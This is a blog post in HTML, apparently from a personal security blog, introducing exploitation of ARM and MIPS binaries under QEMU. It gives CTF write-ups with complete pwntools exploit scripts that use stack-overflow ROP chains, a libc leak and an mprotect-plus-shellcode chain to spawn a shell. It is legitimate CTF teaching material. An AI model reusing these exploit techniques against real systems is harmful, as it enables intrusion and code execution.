@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Computer, Network, Security">
+    <meta name="description" content="a blog on Hexo">
+    <meta name="author" content="TyeYeah">
+    
+    <title>
+        
+            ARM &amp; MIPS PWN Intro |
+        
+        Relish the Moment
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/img/wang.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Relish the Moment
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">ARM &amp; MIPS PWN Intro</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-07-30 21:57:23
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/qemu/">qemu</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/arm/">arm</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/mips/">mips</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/rop/">rop</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.1k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>19 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>This paragraph is to pwn <code>ARM</code> and <code>MIPS</code> binaries, with some examples. </p>
+<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>Basically binaries are executed by <code>QEMU</code>, so some operations in <a class="link"   target="_blank" rel="noopener" href="http://localhost:4000/2020/01/11/2020-01-11-QEMU-Intro-and-Network-Configuration/" >QEMU Intro and Network Configuration<i class="fas fa-external-link-alt"></i></a> are needed.</p>
+<p>Add another one. The tool <a class="link"   target="_blank" rel="noopener" href="https://github.com/nongiach/arm_now" >arm_now<i class="fas fa-external-link-alt"></i></a> on github is wrapped to build the environment.</p>
+<h3 id="Install-Shared-Library"><a href="#Install-Shared-Library" class="headerlink" title="Install Shared Library"></a>Install Shared Library</h3><p>We can search by</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt search <span class="string">&quot;libc6-&quot;</span> | grep <span class="string">&quot;&#123;ARCH&#125;&quot;</span> <span class="comment"># `ARCH` can be arm, mips...</span></span><br></pre></td></tr></table></figure>
+<p>What we need are packages like <code>libc6-&#123;ARCH&#125;-cross</code>. </p>
+<p>As mentioned in <a href="/2020/01/11/2020-01-11-QEMU-Intro-and-Network-Configuration/">QEMU Intro and Network Configuration</a> before, the packages like <code>gcc-&#123;ARCH&#125;-linux-gnuxxx</code> also provides shared libraries.</p>
+<p>All above libs are stored as <code>/usr/&#123;ARCH&#125;-linux-gnuxxx</code>.</p>
+<p>Or visit <a class="link"   target="_blank" rel="noopener" href="https://toolchains.bootlin.com/toolchains.html" >toolchains.bootlin.com<i class="fas fa-external-link-alt"></i></a> to get ready-built libc files including <code>glib</code>, <code>musl</code> and <code>uclibc</code>.</p>
+<h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>Here I mean IDA. We need plugins for MIPS. The <a class="link"   target="_blank" rel="noopener" href="https://github.com/devttys0/ida/tree/master/plugins/mipsrop" >MIPSROP<i class="fas fa-external-link-alt"></i></a> only supports IDA 6.7 and lower versions, because API changed in IDA, but there’s a researcher wrote <a class="link"   target="_blank" rel="noopener" href="https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop" >this new one<i class="fas fa-external-link-alt"></i></a>.</p>
+<p>Disassembler plugin we use <a class="link"   target="_blank" rel="noopener" href="https://github.com/avast/retdec-idaplugin" >Retdec<i class="fas fa-external-link-alt"></i></a> for IDA, <a class="link"   target="_blank" rel="noopener" href="https://github.com/pnfsoftware/PleaseROP" >Please ROP<i class="fas fa-external-link-alt"></i></a> for <a class="link"   target="_blank" rel="noopener" href="https://www.pnfsoftware.com/jeb2/mips" >jeb2<i class="fas fa-external-link-alt"></i></a>, and <a class="link"   target="_blank" rel="noopener" href="https://binary.ninja/" >Binary Ninja<i class="fas fa-external-link-alt"></i></a>. </p>
+<p>As for ARM, Hex-Rays Decompiler plugin supports ARM, even MIPS now. So IDA Pro 7.5 can disassemble both ARM and MIPS now.</p>
+<h3 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h3><p>The <code>gdb</code> is what we need.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt install gdb-multiarch <span class="comment"># same usage as gdb</span></span><br></pre></td></tr></table></figure>
+<p>With shared library installed, we can assign them to program by <code>-L</code> like</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-mipsel -L /usr/mipsel-linux-gnu/ ./program</span><br></pre></td></tr></table></figure>
+<p>Use <code>-g</code> to open ports</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add</span><br></pre></td></tr></table></figure>
+<p>Then in <code>gdb-multiarch</code> (with <a class="link"   target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg" >pwndbg<i class="fas fa-external-link-alt"></i></a>), set architecture and connect </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture mips </span><br><span class="line">pwndbg&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>
+<p>This part is also included in <a href="/2020/01/11/2020-01-11-QEMU-Intro-and-Network-Configuration/#Debug-Programs"><code>Debug Programs</code> part of QEMU Intro and Network Configuration</a>.</p>
+<h2 id="CTF-Examples"><a href="#CTF-Examples" class="headerlink" title="CTF Examples"></a>CTF Examples</h2><p>Here gives some preliminary multi-arch ctf challenges</p>
+<h3 id="Jarvis-oj-typo-ARM"><a href="#Jarvis-oj-typo-ARM" class="headerlink" title="Jarvis oj - typo - ARM"></a>Jarvis oj - typo - ARM</h3><p>Attachment: <a href="/filehost/ampi/typo">typo</a><br>Check the file first (arm-32-little)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file typo</span><br><span class="line">typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br><span class="line">$ checksec typo</span><br><span class="line">[*] &#x27;/root/typo&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure>
+<p>It is a static linked armel-32bit-program. </p>
+<p>When testing we find a long string overflows the <code>program</code>. Then we calculate the padding by using <code>qemu</code> and <code>cyclic</code>.</p>
+<p>But the code is obfuscated, we have trouble figuring out the main logic, while we find <code>/bin/sh</code> at <code>.rodata:0006C384</code>. And according to the cross reference of it,we can find <code>sub_10BA8 (0x10BA8)</code> (someone find <code>sub_110B4 (0x110B4)</code>) which turns out to be <code>system()</code>.</p>
+<p>Then we need a gadget to control <code>$r0</code> and find <code>0x00020904 : pop &#123;r0, r4, pc&#125;</code> using <code>ROPgadget</code>. So we build the stack </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">|   padding  |</span><br><span class="line">|            |</span><br><span class="line">|            |</span><br><span class="line">+------------+</span><br><span class="line">| gadget_addr| &lt;- 0x20904</span><br><span class="line">+------------+</span><br><span class="line">| binsh_addr | &lt;- 0x6C384</span><br><span class="line">+------------+</span><br><span class="line">| junk_data  |</span><br><span class="line">+------------+</span><br><span class="line">| system_addr| &lt;- 0x10BA8 # 0x110B4</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
+<p>Exploit</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;typo&#x27;</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">sh = process(filename)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;quit\n&quot;</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">112</span></span><br><span class="line">bin_sh_str = <span class="number">0x6c384</span></span><br><span class="line">system_addr = <span class="number">0x10BA8</span> <span class="comment"># 0x110B4</span></span><br><span class="line">pop_04pc = <span class="number">0x20904</span>   <span class="comment"># 0x00020904 : pop &#123;r0, r4, pc&#125;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*padding+p32(pop_04pc)+p32(bin_sh_str)+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;\n&quot;</span>,payload) </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Codegate2018-melong-ARM"><a href="#Codegate2018-melong-ARM" class="headerlink" title="Codegate2018 - melong - ARM"></a>Codegate2018 - melong - ARM</h3><p>Attachment: <a href="/filehost/ampi/melong">melong</a><br>Check file infomation (still arm)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file melong</span><br><span class="line">melong: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=2c55e75a072020303e7c802d32a5b82432f329e9, not stripped</span><br><span class="line">$ checksec melong</span><br><span class="line">[*] &#x27;/root/melong&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>
+<p>After reading the pseudocode we can find that in <code>write_diary()</code>, we can give the <code>read()</code> a large size to write to stack and achieve an overflow in <code>main()</code> function frame.</p>
+<p>But before that we have to enter <code>PT()</code> to set size. It has to be negative to pass a comparision statement, and the negative value is regarded as a fairly large unsigned integer.</p>
+<p>After that we enter <code>write_diary()</code> to do <code>rop</code>: first leak <code>libc</code> address, then control it to execute <code>system(&quot;/bin/sh</code>“). </p>
+<p>The next challenge is to go back to <code>main()</code>. The <code>rop</code> in <code>ARM</code> is different from <code>x86</code> because it has no <code>ret</code> instruction. So hijacking program flow is to control <code>$pc</code>.</p>
+<p>We cannot control the program flow just using <code>rop</code> gadgets we give, the only way is to follow the program running and find some <code>pop $regs</code> to control regs (especially <code>$pc</code>). </p>
+<p>Brute forcing can be used to guess how many paddings we need to loop back to main (using <code>cyclic</code> or so, same as how we determine offset in stack overflow), another more preliminary method is to debug step by step and find the significant. gadget: <code>&lt;puts+400&gt;:    pop    &#123;r4, r5, r6, r7, r8, r9, r10, pc&#125;</code>.</p>
+<p>Exploit</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./melong&#x27;</span></span><br><span class="line">libcpath = <span class="string">&#x27;/usr/arm-linux-gnueabi/lib/libc.so.6&#x27;</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libcpath)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;qemu-arm -L /usr/arm-linux-gnueabi ./melong&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">&quot;1\n1.8\n80\n&quot;</span>)    <span class="comment"># check bmi</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">&quot;3\n-123\n&quot;</span>)       <span class="comment"># personal training</span></span><br><span class="line">pad = <span class="number">0x54</span></span><br><span class="line">pop_0pc = <span class="number">0x00011bbc</span> <span class="comment"># 0x00011bbc : pop &#123;r0, pc&#125;</span></span><br><span class="line">leak = <span class="string">b&#x27;a&#x27;</span>*pad + p32(pop_0pc) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">leak += flat(elf.sym[<span class="string">&#x27;main&#x27;</span>])*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">b&quot;4\n&quot;</span>+leak)        <span class="comment"># write_diary</span></span><br><span class="line">sh.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;See you again :)\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;===============================================================================&quot;</span>)</span><br><span class="line">raw_puts = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc.address = raw_puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">&quot;1\n1.8\n80\n&quot;</span>)    <span class="comment"># check bmi</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">&quot;3\n-123\n&quot;</span>)       <span class="comment"># personal training</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*pad + p32(pop_0pc) + p32(<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))) + p32(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">sh.sendafter(<span class="string">&quot;Type the number:&quot;</span>,<span class="string">b&quot;4\n&quot;</span>+payload)        <span class="comment"># write_diary</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Shanghai2018-baby-arm-aarch64"><a href="#Shanghai2018-baby-arm-aarch64" class="headerlink" title="Shanghai2018 - baby_arm - aarch64"></a>Shanghai2018 - baby_arm - aarch64</h3><p>Attachment: <a href="/filehost/ampi/baby_arm">baby_arm</a><br>Still check the file (aarch64 aka. arm64)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file baby_arm</span><br><span class="line">baby_arm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped</span><br><span class="line">$ checksec baby_arm</span><br><span class="line">[*] &#x27;/root/baby_arm&#x27;</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>All we have to notice is just <code>main_logic()</code> and <code>sub_4007F0()</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">main_logic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> v0; <span class="comment">// x0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">initial</span>();</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Name:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">  v0 = <span class="built_in">read</span>(<span class="number">0</span>, &amp;unk_411068, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">sub_4007F0</span>(v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_4007F0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;v1, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Easy to determine the offset using <code>cyclic</code> and we find the <code>NX enabled</code>. And the <code>mprotect()</code> exists and it sets the privilege digit as <code>0</code> which means no execution.</p>
+<p>We can also use it to set <code>bss</code> as <code>writable</code> and <code>executable</code> using <code>mprotect()</code>. Here we use the powerful <code>csu gadget</code> to call any functions with any args, using gadgets in <code>_libc_csu_init()</code>.</p>
+<p>So the whole pass is: write <code>shellcode</code> to <code>bss</code>; use <code>mprotect()</code> to set <code>bss</code> executable; finally call <code>shellcode</code>.</p>
+<p>Exploit</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;qemu-aarch64 -L /usr/aarch64-linux-gnu/ pwn&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_rop</span>(<span class="params">call, x0, x1, x2</span>):</span> </span><br><span class="line">    payload = flat(<span class="number">0x4008CC</span>, <span class="string">&#x27;00000000&#x27;</span>, <span class="number">0x4008ac</span>, <span class="number">0</span>, <span class="number">1</span>, call)</span><br><span class="line">    payload += flat(x2, x1, x0)</span><br><span class="line">    payload += <span class="string">&#x27;12345678&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">padding = asm(<span class="string">&#x27;mov x0, x0&#x27;</span>)</span><br><span class="line">shell = asm(shellcraft.execve(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>,padding*<span class="number">0x10</span>+shell)</span><br><span class="line">payload1 = flat(cyclic(<span class="number">72</span>)+csu_rop(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,elf.got[<span class="string">&#x27;__gmon_start__&#x27;</span>],<span class="number">8</span>))  <span class="comment"># change got</span></span><br><span class="line">payload1 += flat(<span class="number">0x400824</span>)  <span class="comment"># main_logic</span></span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.send(flat(elf.plt[<span class="string">&#x27;mprotect&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>,padding*<span class="number">0x10</span>+shell)</span><br><span class="line">payload2 = flat(cyclic(<span class="number">72</span>)+csu_rop(elf.got[<span class="string">&#x27;__gmon_start__&#x27;</span>], <span class="number">0x411000</span>, <span class="number">0x1000</span>, <span class="number">7</span>)) <span class="comment"># call mprotect</span></span><br><span class="line">payload2 += flat(<span class="number">0x411068</span>)  <span class="comment"># shellcode</span></span><br><span class="line">sh.send(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="HWS2020-Mplogin-mipsel"><a href="#HWS2020-Mplogin-mipsel" class="headerlink" title="HWS2020 - Mplogin - mipsel"></a>HWS2020 - Mplogin - mipsel</h3><p>Attachment: <a href="/filehost/ampi/Mplogin.zip">Mplogin</a><br>Check this file (mipsel)</p>
